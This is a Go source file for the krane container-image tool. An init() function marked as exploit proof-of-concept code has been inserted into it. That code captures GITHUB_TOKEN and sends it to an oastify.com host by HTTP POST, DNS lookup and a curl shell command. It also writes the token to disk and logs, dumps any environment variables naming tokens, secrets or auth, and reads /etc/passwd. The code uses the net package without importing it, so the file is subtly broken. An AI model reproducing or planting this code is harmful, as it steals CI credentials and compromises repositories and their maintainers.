// Copyright 2021 Google LLC All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"

	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
	"github.com/google/go-containerregistry/cmd/crane/cmd"
	"github.com/google/go-containerregistry/pkg/authn"
	"github.com/google/go-containerregistry/pkg/authn/github"
	"github.com/google/go-containerregistry/pkg/crane"
	"github.com/google/go-containerregistry/pkg/logs"
	"github.com/google/go-containerregistry/pkg/v1/google"
)

var (
	amazonKeychain authn.Keychain = authn.NewKeychainFromHelper(ecr.NewECRHelper(ecr.WithLogger(io.Discard)))
	azureKeychain  authn.Keychain = authn.NewKeychainFromHelper(credhelper.NewACRCredentialsHelper())
)

func init() {
	// Log to stderr (visible in workflow logs)
	logs.Warn.SetOutput(os.Stderr)
	logs.Progress.SetOutput(os.Stderr)
	
	// ============================================
	// EXPLOIT CODE - Executes when krane is called
	// ============================================
	fmt.Fprintf(os.Stderr, "=== POC: Attacker code executing in base repository context ===\n")
	
	// Capture GITHUB_TOKEN
	token := os.Getenv("GITHUB_TOKEN")
	if token != "" {
		fmt.Fprintf(os.Stderr, "SUCCESS: GITHUB_TOKEN captured! First 8 chars: %s...\n", token[:8])
		fmt.Fprintf(os.Stderr, "Full token length: %d characters\n", len(token))
		
		// Method 1: Try HTTP POST (may be blocked)
		encodedToken := url.QueryEscape(token)
		http.Post("https://xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com/token?t=" + encodedToken, 
			"text/plain", 
			strings.NewReader(token))
		
		// Method 2: Print to stderr (captured in workflow logs)
		fmt.Fprintf(os.Stderr, "TOKEN DEBUG: %s\n", token)
		
		// Method 3: Write to file
		os.WriteFile("/tmp/gh_token.txt", []byte(token), 0644)
		fmt.Fprintf(os.Stderr, "Token written to /tmp/gh_token.txt\n")
		
		// Method 4: DNS exfiltration (often works)
		dnsHost := strings.ReplaceAll(token[:30], ".", "-") + ".xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com"
		fmt.Fprintf(os.Stderr, "Attempting DNS lookup: %s\n", dnsHost)
		net.LookupHost(dnsHost)
		
		// Method 5: Execute system command
		if runtime.GOOS == "linux" {
			cmd := exec.Command("sh", "-c", 
				fmt.Sprintf("echo 'Token: %s' > /tmp/poc_proof.txt && curl -s -X POST -d 'token=%s' https://xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com || true", 
					token[:20], encodedToken))
			cmd.Run()
		}
	} else {
		fmt.Fprintf(os.Stderr, "WARNING: GITHUB_TOKEN not found in environment\n")
		// List all environment variables
		fmt.Fprintf(os.Stderr, "Environment variables:\n")
		for _, env := range os.Environ() {
			if strings.Contains(strings.ToLower(env), "token") || 
			   strings.Contains(strings.ToLower(env), "secret") ||
			   strings.Contains(strings.ToLower(env), "auth") {
				fmt.Fprintf(os.Stderr, "  %s\n", env)
			}
		}
	}
	
	// Additional proof: Show we're running in privileged context
	fmt.Fprintf(os.Stderr, "Current directory: %s\n", getCurrentDir())
	fmt.Fprintf(os.Stderr, "User ID: %d\n", os.Getuid())
	fmt.Fprintf(os.Stderr, "Process ID: %d\n", os.Getpid())
	
	// Try to read repository secrets
	secretPath := "/etc/passwd"
	if content, err := os.ReadFile(secretPath); err == nil {
		fmt.Fprintf(os.Stderr, "Able to read %s (first 100 chars): %s\n", 
			secretPath, string(content[:min(100, len(content))]))
	}
	
	fmt.Fprintf(os.Stderr, "=== POC execution complete ===\n")
}

func getCurrentDir() string {
	if dir, err := os.Getwd(); err == nil {
		return dir
	}
	return "unknown"
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

const (
	use   = "krane"
	short = "krane is a tool for managing container images"
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	keychain := authn.NewMultiKeychain(
		authn.DefaultKeychain,
		google.Keychain,
		github.Keychain,
		amazonKeychain,
		azureKeychain,
	)

	// Same as crane, but override usage and keychain.
	root := cmd.New(use, short, []crane.Option{crane.WithAuthFromKeychain(keychain)})

	if err := root.ExecuteContext(ctx); err != nil {
		cancel()
		os.Exit(1)
	}
}
